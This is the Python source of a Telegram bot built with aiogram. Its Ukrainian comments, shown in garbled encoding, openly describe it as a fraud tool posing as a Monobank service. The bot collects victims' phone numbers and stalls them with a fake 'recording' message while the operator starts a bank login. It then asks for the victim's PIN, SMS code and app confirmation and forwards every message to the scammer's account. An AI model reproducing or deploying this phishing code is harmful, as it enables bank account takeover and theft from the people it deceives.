import aiogram
import logging
from aiogram.types.reply_keyboard import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types.inline_keyboard import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram import types, executor, Dispatcher, Bot

def log(message):
    print("<!------!>")
    from datetime import datetime
    print(datetime.now())
    print("–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç {0} {1} (id = {2}) \n {3}".format(message.from_user.first_name,
                                                              message.from_user.last_name,
                                                              str(message.from_user.id), message.text))


logging.basicConfig()

bot = aiogram.Bot("TOKEN") # –¢–æ–∫–µ–Ω
storage = MemoryStorage()
dp = aiogram.Dispatcher(bot, storage=storage)




saved_contacts: dict[int, aiogram.types.Contact] = {}

class States(StatesGroup):
    code = State()
    contact = State()

@dp.message_handler(commands=["start"]) # –§—É–Ω–∫—Ü—ñ—è –ø—ñ—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —Ç–∞ –æ–∑–Ω–∞–π–æ–º–ª–µ–Ω–Ω—è –∑ —É–º–æ–≤–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞–Ω–Ω—è
async def start_handler(message: aiogram.types.Message):
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = KeyboardButton('–ü—ñ—Ç–≤–µ—Ä–¥–∏—Ç–∏‚úÖ') # –ö–Ω–æ–ø–∫–∞ –ø—ñ—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è, —è–∫–∞ –∑–∞–ø—É—Å–∫–∞—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –µ—Ç–∞–ø
        markup.add(btn1)
        markupchik = InlineKeyboardMarkup()
        btn1 = InlineKeyboardButton('–û–∑–Ω–∞–π–æ–º–∏—Ç–∏—Å—å‚úÖ', url = 'https://monobankinfo.com.ua/privacy-policy/') # –ö–Ω–æ–ø–∫–∞ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥—É –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º
        markupchik.add(btn1)
        await bot.send_message(message.chat.id, "–ü–µ—Ä—à –Ω—ñ–∂ –ø–æ—á–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ç–∏—Å—å –ø–æ—Å–ª—É–≥–∞–º–∏ –Ω–∞—à–æ–≥–æ –±–æ—Ç–∞, –≤–∞–º –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –æ–∑–Ω–∞–π–æ–º–∏—Ç–∏—Å—å –∑ —É–º–æ–≤–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞–Ω–Ω—è.", reply_markup=markupchik)
        await bot.send_message(message.chat.id, "–û—á—ñ–∫—É—î–º–æ –≤–∞—à–æ–≥–æ –ø—ñ—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è —â–æ –≤–∏ –æ–∑–Ω–∞–π–æ–º–∏–ª–∏—Å—å", reply_markup=markup)
        log(message)
    
        

        


@dp.message_handler(commands=["vxid"], state="*") # –§—É–Ω–∫—Ü—ñ—è –≤—Ö–æ–¥—É
async def start_handler(message: aiogram.types.Message, state: FSMContext):
    if message.from_user.id == ID:     #–ù–∞–±—ñ—Ä —á–∏—Å–µ–ª, —Ü–µ id –∞–∫–∫–∞—É–Ω—Ç—É —Ç–µ–ª–µ–≥—Ä–∞–º, —á–µ—Ä–µ–∑ —è–∫–∏–π –±—É–¥–µ –ø—Ä–æ–≤–æ–¥–∏—Ç–∏—Å—å —à–∞—Ö—Ä–∞–π—Å—Ç–≤–æ
        await message.reply("–û—á—ñ–∫—É–π –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å") # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —à–∞—Ö—Ä–∞—é –≤—ñ–¥ –±–æ—Ç–∞
    elif message.from_user.id not in saved_contacts:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton(
            "–ü–æ–¥—ñ–ª–∏—Ç–∏—Å—å –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω—É", request_contact=True)) 

        await message.reply("ü§ñ–ù–µ–æ–±—Ö—ñ–¥–Ω–æ –ø–æ–¥—ñ–ª–∏—Ç–∏—Å—å –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω—É —â–æ–± –±–æ—Ç –∑–∞–ø–∏—Å–∞–≤ –≤–∞—à –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –¥–æ –±–∞–∑–∏, —Ü–µ —Ä–æ–±–∏—Ç—å—Å—è –¥–ª—è –±—ñ–ª—å—à –ª–µ–≥—à–æ–≥–æ –≤—Ö–æ–¥—É –¥–æ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ –∫–∞–±—ñ–Ω–µ—Ç—É –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ä–∞–∑–∏.", reply_markup=markup)
        await States.contact.set()
    else:
        await message.reply("ü§ñ–û—á—ñ–∫—É–π—Ç–µ, –π–¥–µ –∑–∞–ø–∏—Å") # –§–µ–π–∫ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —â–æ–± —É —à–∞—Ö—Ä–∞—è –±—É–≤ —á–∞—Å –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –¥–æ –±–∞–Ω–∫—É

        confirm_markup = InlineKeyboardMarkup() # –§—É–Ω–∫—Ü—ñ—è –∑–∞–ø–∏—Ç—É –¥–∞–Ω–∏—Ö –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –≤—ñ–¥ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞
        confirm_markup.add(InlineKeyboardButton(
            "–ó–∞–ø–∏—Ç–∞—Ç–∏ –¥–∞–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É", callback_data=str(message.from_user.id))) #–¢—É—Ç —à–∞—Ö—Ä–∞–π –∑–∞–ø–∏—Ç—É—î –¥–∞–Ω—ñ –¥–ª—è –≤—Ö–æ–¥—É –Ω–∞—Ç–∏—Å–Ω—É–≤—à–∏ –Ω–∞ –∫–Ω–æ–ø–∫—É, –ø—ñ—Å–ª—è —á–æ–≥–æ –≤—ñ–¥–ø—Ä–∞–≤–ª—è–µ—Ç—å—Å—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –∑–∞–ø–∏—Ç–æ–º
        await bot.send_message(ID,  "ID: {}\n–ù–æ–º–µ—Ä: {}".format(saved_contacts[message.from_user.id].user_id, saved_contacts[message.from_user.id].phone_number), reply_markup=confirm_markup)
        log(message)
        
@dp.callback_query_handler(state="*")
async def confirm_handler(query: aiogram.types.CallbackQuery):
    await query.answer(cache_time=1) #–§—É–Ω–∫—Ü—ñ—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –∑–∞–ø–∏—Ç–æ–º –¥–∞–Ω–∏—Ö –¥–ª—è –≤—Ö–æ–¥—É.
    
    chat_id = int(query.data)
    await bot.send_message(chat_id, "ü§ñ–ó–∞–ø–∏—Å —É—Å–ø—ñ—à–Ω–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ, —Ç–µ–ø–µ—Ä –≤–∞–º –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –ø—Ä–∏–≤'—è–∑–∞—Ç–∏ –æ—Å–æ–±–∏—Å—Ç–∏–π –∫–∞–±—ñ–Ω–µ—Ç –º–æ–Ω–æ–±–∞–Ω–∫ –¥–æ —Å–∞–º–æ–≥–æ –±–æ—Ç–∞.\n\n–í–≤–µ–¥—ñ—Ç—å –¥–æ –±–æ—Ç–∞ –Ω–∞—Å—Ç—É–ø–Ω–µ - \n1. –ü—ñ–Ω-–∫–æ–¥ –¥–ª—è –≤—Ö–æ–¥—É:\n2. –°–ú–°-–∫–æ–¥(–ê–±–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑–∞—Å—Ç–æ—Å—É–Ω–∫—É):\n3. –ü—ñ—Ç–≤–µ—Ä–¥—ñ—Ç—å –≤—Ö—ñ–¥(–Ø–∫—â–æ –±—É–¥–µ –∑–∞–ø–∏—Ç) —á–µ—Ä–µ–∑ –∑–∞—Å—Ç–æ—Å—É–Ω–æ–∫.\n\n–Ø–∫—â–æ –≤—Å—ñ –¥–∞–Ω—ñ –ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–∫–∞–∑–∞–Ω—ñ, —á–µ—Ä–µ–∑ 5 —Ö–≤–∏–ª–∏–Ω –ø—Ä–æ–ø–∏—à—ñ—Ç—å –∫–æ–º–∞–Ω–¥—É /start —â–µ —Ä–∞–∑.")
    await bot.send_message(ID, "–ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ —É—Å–ø—ñ—à–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ –∑–∞–ø–∏—Ç –Ω–∞ –æ—Å–æ–±–∏—Å—Ç—ñ –¥–∞–Ω—ñ.")
    await States.code.set()


@dp.message_handler(state="*", content_types=aiogram.types.ContentTypes.TEXT | aiogram.types.ContentTypes.PHOTO | aiogram.types.ContentTypes.VIDEO | aiogram.types.ContentTypes.AUDIO | aiogram.types.ContentTypes.DOCUMENT | aiogram.types.ContentTypes.VOICE)
async def code_handler(message: aiogram.types.Message, state: FSMContext): # –§—É–Ω–∫—Ü—ñ—è –ø–µ—Ä–µ—Ö–≤–∞—Ç—É –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å
    if saved_contacts.get(message.from_user.id):
        if message.from_user.id != ID:
            if message.content_type == aiogram.types.ContentType.TEXT:
                await bot.send_message(ID,  "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.PHOTO:
                await bot.send_photo(ID, message.photo[-1].file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.AUDIO:
                await bot.send_audio(ID, message.audio.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.VIDEO:
                await bot.send_video(ID,  message.video.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.DOCUMENT:
                await bot.send_document(ID,  message.document.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.VOICE:
                await bot.send_voice(ID,  message.voice.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))

    elif message.text == '–ü—ñ—Ç–≤–µ—Ä–¥–∏—Ç–∏‚úÖ':
        await bot.send_message(message.from_user.id, 'ü§ñ–í–∞–º –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ —É–≤—ñ–π—Ç–∏ –¥–æ —Å–≤–æ–≥–æ –æ—Å–æ–±–∏—Å—Ç–æ–≥–æ –∫–∞–±—ñ–Ω–µ—Ç—É Monobank, –¥–ª—è —Ü—å–æ–≥–æ –≤–≤–µ–¥—ñ—Ç—å –∫–æ–º–∞–Ω–¥—É /vxid') # –í—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –ø—ñ—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –æ–∑–Ω–∞–π–æ–º–ª–µ–Ω–Ω—è
        log(message)

@dp.message_handler(state=States.contact, content_types=aiogram.types.ContentTypes.CONTACT)
async def contact_handler(message: aiogram.types.Message, state: FSMContext):
    saved_contacts[message.from_user.id] = message.contact
    await state.set_state()
    await message.reply("–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω—É —É—Å–ø—ñ—à–Ω–æ –¥–æ–¥–∞–Ω–æ‚úÖ", reply_markup=ReplyKeyboardRemove())
    await start_handler(message, state)
















aiogram.executor.start_polling(dp, skip_updates=True) # –§—É–Ω–∫—Ü—ñ—è –∑–∞–ø—É—Å–∫—É